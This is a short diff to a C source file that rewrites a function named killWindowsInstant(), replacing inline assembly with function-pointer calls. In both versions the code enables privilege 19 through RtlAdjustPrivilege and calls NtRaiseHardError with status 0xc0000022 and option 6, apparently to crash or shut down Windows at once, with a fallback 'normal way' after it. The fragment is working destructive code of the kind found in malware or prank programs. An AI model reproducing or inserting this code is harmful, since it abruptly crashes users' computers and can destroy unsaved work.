@@ -486,26 +486,8 @@ void killWindowsInstant() {
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
 
 	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
-		__asm {
-			push offset tmp1
-
-			push byte ptr 0
-			push byte ptr 1
-			push dword ptr 19
-
-			call RtlAdjustPrivilege
-
-			push offset tmp2
-
-			push dword ptr 6
-			push dword ptr 0
-			push dword ptr 0
-			push dword ptr 0
-
-			push dword ptr 0xc0000022
-
-			call NtRaiseHardError
-		};
+		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
+		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
 	}
 
 	// If the computer is still running, do it the normal way
